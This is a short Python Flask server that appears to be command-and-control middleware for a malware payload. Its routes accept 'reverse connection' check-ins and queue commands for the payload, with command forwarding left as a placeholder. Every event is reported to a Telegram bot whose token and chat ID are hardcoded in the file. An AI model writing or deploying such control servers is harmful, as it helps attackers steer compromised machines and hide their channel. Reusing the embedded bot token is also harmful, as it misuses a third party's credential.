from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = "7557926778:AAH74UZc7JB5KSa0tJWRjqlBDlFDeEruog8"
TELEGRAM_CHAT_ID = "6351444693"

# Function to notify via Telegram
def notify_telegram(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_message = f"{message}\n⏰ Timestamp: {timestamp}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": full_message
    }
    try:
        requests.post(url, json=payload)
        print(f"Notification sent: {message}")
    except Exception as e:
        print(f"Failed to send notification: {e}")

# Notify when middleware starts
notify_telegram("🚀 Middleware is up and running!")

# Route to handle incoming payload connections
@app.route('/payload', methods=['POST'])
def handle_payload():
    try:
        data = request.json  # Get the payload data
        print(f"Payload Data Received: {data}")

        # Notify Telegram about the reverse connection
        notify_telegram("📡 Reverse connection established! Ready to receive commands.")
        return "Connection successful", 200
    except Exception as e:
        notify_telegram(f"⚠️ Error receiving payload connection: {str(e)}")
        return "Error", 500

# Route to send commands to the payload
@app.route('/command', methods=['POST'])
def send_command():
    try:
        command = request.json.get("command")
        print(f"Received Command: {command}")

        # Simulated forwarding to payload (replace with actual logic)
        notify_telegram(f"📤 Command sent to payload: {command}")
        return f"Command '{command}' processed successfully", 200
    except Exception as e:
        notify_telegram(f"⚠️ Error sending command: {str(e)}")
        return "Error", 500

# Run the Flask app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
